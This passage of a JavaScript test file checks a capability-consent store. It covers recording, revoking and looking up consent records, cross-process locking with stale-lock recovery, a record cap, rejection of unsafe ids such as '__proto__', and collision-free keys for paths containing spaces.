    consent.recordProjectConsent({ gsdHome: home, projectRoot, id: 'cap', integrity: 'i', disclosureSignature: 's', contentHash: 'sha512-h' });
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot: otherProject, id: 'cap', contentHash: 'sha512-h' }), false);
  } finally {
    cleanup(home);
    cleanup(projectRoot);
    cleanup(otherProject);
  }
});

test('has: returns false (never throws) for an unsafe capability id', () => {
  const home = tmpDir();
  const projectRoot = realProject();
  try {
    for (const bad of ['__proto__', 'constructor', 'prototype', 'Not-Kebab', 'with space', '../escape']) {
      assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot, id: bad, contentHash: 'sha512-h' }), false, `unsafe id ${bad} → false`);
    }
  } finally {
    cleanup(home);
    cleanup(projectRoot);
  }
});

test('record: rejects an unsafe capability id (prototype-pollution-safe), nothing written', () => {
  const home = tmpDir();
  const projectRoot = realProject();
  try {
    assert.throws(() => consent.recordProjectConsent({ gsdHome: home, projectRoot, id: '__proto__', integrity: 'i', disclosureSignature: 's', contentHash: 'sha512-h' }));
    const store = consent.readConsentStore(home);
    assert.deepStrictEqual(Object.keys(store.records), []);
    assert.strictEqual({}.polluted, undefined);
  } finally {
    cleanup(home);
    cleanup(projectRoot);
  }
});

test('record is idempotent: re-recording the same key overwrites in place (one record)', () => {
  const home = tmpDir();
  const projectRoot = realProject();
  try {
    consent.recordProjectConsent({ gsdHome: home, projectRoot, id: 'cap', integrity: 'i1', disclosureSignature: 's1', contentHash: 'sha512-h1' });
    consent.recordProjectConsent({ gsdHome: home, projectRoot, id: 'cap', integrity: 'i2', disclosureSignature: 's2', contentHash: 'sha512-h2' });
    const onDisk = JSON.parse(fs.readFileSync(consent.consentStorePath(home), 'utf8'));
    assert.strictEqual(Object.keys(onDisk.records).length, 1);
    const key = JSON.stringify({ r: projectRoot, i: 'cap' });
    assert.strictEqual(onDisk.records[key].contentHash, 'sha512-h2');
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot, id: 'cap', contentHash: 'sha512-h2' }), true);
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot, id: 'cap', contentHash: 'sha512-h1' }), false);
  } finally {
    cleanup(home);
    cleanup(projectRoot);
  }
});

test('record preserves OTHER existing records (atomic round-trip across multiple caps)', () => {
  const home = tmpDir();
  const projectRoot = realProject();
  try {
    consent.recordProjectConsent({ gsdHome: home, projectRoot, id: 'cap-a', integrity: 'ia', disclosureSignature: 'sa', contentHash: 'sha512-a' });
    consent.recordProjectConsent({ gsdHome: home, projectRoot, id: 'cap-b', integrity: 'ib', disclosureSignature: 'sb', contentHash: 'sha512-b' });
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot, id: 'cap-a', contentHash: 'sha512-a' }), true);
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot, id: 'cap-b', contentHash: 'sha512-b' }), true);
  } finally {
    cleanup(home);
    cleanup(projectRoot);
  }
});

test('revoke removes a record (has → false afterward); no-op when absent', () => {
  const home = tmpDir();
  const projectRoot = realProject();
  try {
    consent.recordProjectConsent({ gsdHome: home, projectRoot, id: 'cap', integrity: 'i', disclosureSignature: 's', contentHash: 'sha512-h' });
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot, id: 'cap', contentHash: 'sha512-h' }), true);
    consent.revokeProjectConsent({ gsdHome: home, projectRoot, id: 'cap' });
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot, id: 'cap', contentHash: 'sha512-h' }), false, 'record removed by revoke');
    assert.doesNotThrow(() => consent.revokeProjectConsent({ gsdHome: home, projectRoot, id: 'cap' }));
    assert.doesNotThrow(() => consent.revokeProjectConsent({ gsdHome: home, projectRoot, id: 'never' }));
  } finally {
    cleanup(home);
    cleanup(projectRoot);
  }
});

test('revoke leaves OTHER records intact', () => {
  const home = tmpDir();
  const projectRoot = realProject();
  try {
    consent.recordProjectConsent({ gsdHome: home, projectRoot, id: 'cap-a', integrity: 'ia', disclosureSignature: 'sa', contentHash: 'sha512-a' });
    consent.recordProjectConsent({ gsdHome: home, projectRoot, id: 'cap-b', integrity: 'ib', disclosureSignature: 'sb', contentHash: 'sha512-b' });
    consent.revokeProjectConsent({ gsdHome: home, projectRoot, id: 'cap-a' });
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot, id: 'cap-a', contentHash: 'sha512-a' }), false);
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot, id: 'cap-b', contentHash: 'sha512-b' }), true, 'sibling record preserved');
  } finally {
    cleanup(home);
    cleanup(projectRoot);
  }
});

// ---------------------------------------------------------------------------
// B — concurrency (CONSENT-CONCURRENCY-1)
// ---------------------------------------------------------------------------

test('two concurrent cross-project consent writes both survive (CONSENT-CONCURRENCY-1)', async () => {
  // revert-fails: if record/revoke did NOT take the consent-store-dir lock around the read-modify-
  // write, two concurrent writers to the same store would lose-update (B reads, A writes, B overwrites
  // with its stale snapshot), and only one record would survive — this assertion would FAIL.
  const { spawn } = require('node:child_process');
  const home = tmpDir();
  const projA = realProject();
  const projB = realProject();
  try {
    const modPath = path.resolve('gsd-core/bin/lib/capability-consent.cjs');
    // Run the two record writes in genuinely separate processes that hit the cross-process O_EXCL
    // lock concurrently (an in-process Promise.all would not exercise the file lock at all).
    const writeIn = (proj, id, hash) => new Promise((resolve, reject) => {
      const code = `require(${JSON.stringify(modPath)}).recordProjectConsent(` +
        `{gsdHome:${JSON.stringify(home)},projectRoot:${JSON.stringify(proj)},id:${JSON.stringify(id)},` +
        `integrity:'i',disclosureSignature:'s',contentHash:${JSON.stringify(hash)}})`;
      const child = spawn(process.execPath, ['-e', code], { stdio: 'ignore' });
      child.on('error', reject);
      child.on('exit', (codeNum) => (codeNum === 0 ? resolve() : reject(new Error(`child exited ${codeNum}`))));
    });
    await Promise.all([
      writeIn(projA, 'cap-a', 'sha512-a'),
      writeIn(projB, 'cap-b', 'sha512-b'),
    ]);
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot: projA, id: 'cap-a', contentHash: 'sha512-a' }), true, 'project A record survived');
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot: projB, id: 'cap-b', contentHash: 'sha512-b' }), true, 'project B record survived (no lost update)');
  } finally {
    cleanup(home);
    cleanup(projA);
    cleanup(projB);
  }
});

// ---------------------------------------------------------------------------
// Finding 3 (MEDIUM, #1459): a consent write must NOT proceed UNLOCKED. If the consent-
// store lock cannot be acquired, record/revoke must THROW (never do an unlocked
// read-modify-write → lost update). The lifecycle treats a consent-write failure as
// NON-FATAL + warns (round-2 IC-05), so throwing here is safe (install still succeeds;
// the cap stays inactive until consent can be written).
// ---------------------------------------------------------------------------

// Build a JSON lock body matching the shared lock primitive's shape (so it parses as a real holder).
function consentLockBody({ pid = process.pid, host = os.hostname(), ts = Date.now(), startTime = 'CSTART' } = {}) {
  return JSON.stringify({ token: `${pid}-${ts}-1`, pid, hostname: host, startTime, ts });
}

// Plant a FRESH (under the stale window) lock at the consent-store lock path so acquireConsentLock,
// which must NOT steal a fresh lock, returns null within its attempt budget.
function plantFreshConsentLock(home) {
  const lockPath = consent.consentLockPath(home);
  fs.mkdirSync(path.dirname(lockPath), { recursive: true });
  fs.writeFileSync(lockPath, consentLockBody({ ts: Date.now() }), 'utf8'); // fresh ts → never stolen
  return lockPath;
}

test('finding-3: recordProjectConsent THROWS when the consent lock cannot be acquired (no unlocked write)', () => {
  // revert-fails: if record proceeded UNLOCKED on a failed lock acquire, this assertion would not throw
  // and the store would be mutated without the lock (the lost-update vector). With the fix, a held fresh
  // lock makes acquire return null → record throws and the store is left UNCHANGED.
  const home = tmpDir();
  const projectRoot = realProject();
  try {
    plantFreshConsentLock(home);
    assert.throws(
      () => consent.recordProjectConsent({ gsdHome: home, projectRoot, id: 'cap', integrity: 'i', disclosureSignature: 's', contentHash: 'sha512-h' }),
      /lock/i,
      'record must throw (lock-acquire failure) rather than write unlocked',
    );
    // The store must be UNCHANGED — no record was written (the lock file is not the store file).
    assert.deepStrictEqual(consent.readConsentStore(home), { records: {} }, 'no record written without the lock');
  } finally {
    cleanup(home);
    cleanup(projectRoot);
  }
});

test('finding-3: revokeProjectConsent THROWS when the consent lock cannot be acquired (no unlocked delete)', () => {
  // revert-fails: if revoke proceeded UNLOCKED on a failed lock acquire, it would silently delete (or
  // no-op) without the lock and NOT throw — this assertion would FAIL. With the fix, a held fresh lock
  // makes acquire return null → revoke throws and the existing record is preserved.
  const home = tmpDir();
  const projectRoot = realProject();
  try {
    // Seed a real record FIRST (under a free lock), then plant the fresh lock to block the revoke.
    consent.recordProjectConsent({ gsdHome: home, projectRoot, id: 'cap', integrity: 'i', disclosureSignature: 's', contentHash: 'sha512-h' });
    plantFreshConsentLock(home);
    assert.throws(
      () => consent.revokeProjectConsent({ gsdHome: home, projectRoot, id: 'cap' }),
      /lock/i,
      'revoke must throw (lock-acquire failure) rather than delete unlocked',
    );
    // The record must STILL be present — the blocked revoke did not mutate the store.
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot, id: 'cap', contentHash: 'sha512-h' }), true, 'record preserved (revoke blocked, no unlocked delete)');
  } finally {
    cleanup(home);
    cleanup(projectRoot);
  }
});

// ---------------------------------------------------------------------------
// Finding 4 (MEDIUM, #1459): the consent lock must use the HARDENED steal protocol
// (shared with the lifecycle lock — pid + process-start-time identity + hard deadman).
// It must NEVER stale-steal a verified-live SAME-host holder, but MUST reclaim a dead
// holder, and must never deadlock. Tests inject deterministic liveness probes.
// ---------------------------------------------------------------------------

function withConsentLockProbes(t, { alive, startTime }) {
  consent._setLockProbes({ isPidAlive: () => alive, getProcessStartTime: () => startTime });
  t.after(() => consent._resetLockProbes());
}

// Backdate both the body ts and the file mtime to a given age (mirrors the lifecycle lock test helper).
function ageConsentLock(lockPath, ageMs, body) {
  let written = body;
  try {
    const obj = JSON.parse(body);
    if (obj && typeof obj === 'object' && 'ts' in obj) { obj.ts = Date.now() - ageMs; written = JSON.stringify(obj); }
  } catch { /* not JSON */ }
  fs.writeFileSync(lockPath, written, 'utf8');
  const t = new Date(Date.now() - ageMs);
  fs.utimesSync(lockPath, t, t);
}

test('finding-4: the consent lock does NOT stale-steal a VERIFIED-LIVE same-host holder (no lost update)', (t) => {
  // revert-fails: the OLD consent lock stole any holder older than 60s using mtime ALONE, so a stale-
  // but-live writer would be stolen here → record would SUCCEED (no throw) and overwrite the live
  // writer's store. With the hardened protocol, a verified-live holder is sacrosanct → acquire returns
  // null → record throws and the planted lock body is untouched.
  const home = tmpDir();
  const projectRoot = realProject();
  try {
    withConsentLockProbes(t, { alive: true, startTime: 'CSTART' }); // pid alive + start-time MATCH → verified-live
    const lockPath = consent.consentLockPath(home);
    fs.mkdirSync(path.dirname(lockPath), { recursive: true });
    const body = consentLockBody({ startTime: 'CSTART' });
    ageConsentLock(lockPath, 2 * 60 * 1000, body); // 2 min old (past the 60s stale window)
    const original = fs.readFileSync(lockPath, 'utf8');
    assert.throws(
      () => consent.recordProjectConsent({ gsdHome: home, projectRoot, id: 'cap', integrity: 'i', disclosureSignature: 's', contentHash: 'sha512-h' }),
      /lock/i,
      'a verified-live holder must NOT be stolen (record cannot acquire → throws)',
    );
    assert.strictEqual(fs.readFileSync(lockPath, 'utf8'), original, 'the verified-live consent lock body must be untouched');
  } finally {
    cleanup(home);
    cleanup(projectRoot);
  }
});

test('finding-4: the consent lock RECLAIMS a dead same-host holder (fast local recovery, no deadlock)', (t) => {
  // revert-fails: if the hardened protocol never reclaimed a dead holder (e.g. deadman-only with no
  // dead-pid fast path), a crashed writer's stale lock would block this record forever → it would throw
  // and the record would never be written. With dead-pid fast recovery, acquire steals the dead lock and
  // record SUCCEEDS — this assertion (record present) would FAIL under a never-reclaim regression.
  const home = tmpDir();
  const projectRoot = realProject();
  try {
    withConsentLockProbes(t, { alive: false, startTime: 'CSTART' }); // pid DEAD → not verified-live → steal-eligible
    const lockPath = consent.consentLockPath(home);
    fs.mkdirSync(path.dirname(lockPath), { recursive: true });
    ageConsentLock(lockPath, 2 * 60 * 1000, consentLockBody({ startTime: 'CSTART' })); // stale (>60s), dead pid
    assert.doesNotThrow(
      () => consent.recordProjectConsent({ gsdHome: home, projectRoot, id: 'cap', integrity: 'i', disclosureSignature: 's', contentHash: 'sha512-h' }),
      'a dead holder must be reclaimed so record proceeds',
    );
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot, id: 'cap', contentHash: 'sha512-h' }), true, 'record written after reclaiming the dead holder');
  } finally {
    cleanup(home);
    cleanup(projectRoot);
  }
});

// ---------------------------------------------------------------------------
// B — MAX_RECORDS enforced at WRITE (CONSENT-MAXRECORDS-WRITE-1)
// ---------------------------------------------------------------------------

test('exactly MAX_RECORDS records can be written; the (MAX+1)th NEW key is refused at write', () => {
  // revert-fails: if recordProjectConsent did not enforce MAX_RECORDS BEFORE the write, the (MAX+1)th
  // write would succeed and the on-disk store would exceed the cap (a store readConsentStore would
  // then refuse wholesale), so this throw assertion would FAIL.
  const home = tmpDir();
  try {
    const MAX = consent.MAX_RECORDS;
    // Seed the store on disk at exactly MAX records (cheaper than MAX real lock cycles).
    // Use path.resolve() for the seed keys so they match the normalization that production
    // applies via consentProjectRoot (realpathSync fallback → path.resolve). On Windows,
    // path.resolve('/p0') === 'C:\\p0', so a raw '/p0' key would NOT match the production
    // lookup and the re-record below would be treated as a NEW key → false cap-full throw.
    fs.mkdirSync(path.join(home, '.gsd'), { recursive: true });
    const records = {};
    for (let i = 0; i < MAX; i++) {
      const r = path.resolve(`/p${i}`);
      records[JSON.stringify({ r, i: `cap${i}` })] = { projectRoot: r, id: `cap${i}`, scope: 'project', integrity: 'i', disclosureSignature: 's', contentHash: 'sha512-x', consentedAt: '2026-01-01T00:00:00Z' };
    }
    fs.writeFileSync(consent.consentStorePath(home), JSON.stringify({ version: '1', records }), 'utf8');
    assert.strictEqual(Object.keys(consent.readConsentStore(home).records).length, MAX, 'store seeded at the cap');
    // A re-record of an EXISTING key does NOT grow the store → allowed even at the cap.
    const existingProj = path.resolve('/p0');
    assert.doesNotThrow(() => consent.recordProjectConsent({ gsdHome: home, projectRoot: existingProj, id: 'cap0', integrity: 'i', disclosureSignature: 's', contentHash: 'sha512-new' }));
    // Adding a NEW key when already at the cap is refused with a clear 'full' error.
    const fresh = realProject();
    try {
      assert.throws(() => consent.recordProjectConsent({ gsdHome: home, projectRoot: fresh, id: 'overflow', integrity: 'i', disclosureSignature: 's', contentHash: 'sha512-of' }), /full|maximum/i);
    } finally {
      cleanup(fresh);
    }
  } finally {
    cleanup(home);
  }
});

// ---------------------------------------------------------------------------
// B — WIN-3 space-boundary disk-key collision-safety
// ---------------------------------------------------------------------------

test('WIN-3: roots containing spaces are keyed unambiguously on disk (no collision/mangling)', () => {
  // revert-fails: the on-disk key is the unambiguous JSON-object form {"r":<realRoot>,"i":<id>}. If a
  // regression reverted to a delimiter-joined disk key that does not survive a space in the path (the
  // Windows `C:\Users\John Smith\...` case) — e.g. a `<root> <id>` space-join later parsed by
  // splitting on the space, or any encoding that loses the root/id boundary when the root has a space
  // — two distinct space-containing roots would alias and one record would be clobbered, making the
  // record-count and one of the has-checks below FAIL. The JSON-object key keeps every pair distinct.
  const home = tmpDir();
  try {
    const r1 = '/tmp/space root one';   // path containing spaces (Windows-style)
    const r2 = '/tmp/space root one x'; // a DIFFERENT root extending r1 past a space boundary
    consent.recordProjectConsent({ gsdHome: home, projectRoot: r1, id: 'cap-a', integrity: 'i', disclosureSignature: 's', contentHash: 'sha512-1' });
    consent.recordProjectConsent({ gsdHome: home, projectRoot: r2, id: 'cap-b', integrity: 'i', disclosureSignature: 's', contentHash: 'sha512-2' });
    const onDisk = JSON.parse(fs.readFileSync(consent.consentStorePath(home), 'utf8'));
    assert.strictEqual(Object.keys(onDisk.records).length, 2, 'two distinct records, no disk-key collision');
    assert.ok(onDisk.records[JSON.stringify({ r: path.resolve(r1), i: 'cap-a' })], 'r1 (space path) record keyed unambiguously');
    assert.ok(onDisk.records[JSON.stringify({ r: path.resolve(r2), i: 'cap-b' })], 'r2 (space path) record keyed unambiguously');
    // Both are independently retrievable (the lookup re-keys via the canonical NUL key).
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot: r1, id: 'cap-a', contentHash: 'sha512-1' }), true);
    assert.strictEqual(consent.hasProjectConsent({ gsdHome: home, projectRoot: r2, id: 'cap-b', contentHash: 'sha512-2' }), true);
  } finally {
    cleanup(home);
  }
});

void crypto; // reserved import; keep explicit.
